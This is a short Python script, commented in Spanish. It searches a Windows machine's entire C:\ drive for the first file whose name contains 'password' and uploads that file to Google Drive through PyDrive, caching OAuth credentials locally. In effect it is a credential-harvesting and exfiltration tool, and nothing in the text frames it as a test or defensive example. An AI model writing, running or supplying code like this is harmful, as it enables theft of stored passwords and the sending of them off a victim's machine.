from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive
import os

def authenticate():
    gauth = GoogleAuth()
    gauth.LoadCredentialsFile("mycreds.txt")
    if not gauth.credentials:
        gauth.LocalWebserverAuth()
    elif gauth.access_token_expired:
        gauth.Refresh()
    else:
        gauth.Authorize()
    gauth.SaveCredentialsFile("mycreds.txt")
    return GoogleDrive(gauth)

def upload_to_drive(file_path):
    drive = authenticate()
    file = drive.CreateFile({'title': os.path.basename(file_path)})  # Título del archivo en Google Drive
    file.SetContentFile(file_path)  # Ruta del archivo local que se va a subir
    file.Upload()  # Subir el archivo
    print(f"Archivo '{file_path}' subido con éxito.")

def find_file_with_password(start_dir):
    for root, dirs, files in os.walk(start_dir):
        for file in files:
            if 'password' in file.lower():
                file_path = os.path.join(root, file)
                print(f"Archivo encontrado: {file_path}")
                return file_path
    return None

if __name__ == "__main__":
    # Directorio de inicio para la búsqueda de archivos
    start_directory = "C:\\"  # Raíz del sistema en Windows
    file_to_upload = find_file_with_password(start_directory)
    if file_to_upload:
        upload_to_drive(file_to_upload)
    else:
        print("No se encontró ningún archivo cuyo nombre contenga la palabra 'password'.")
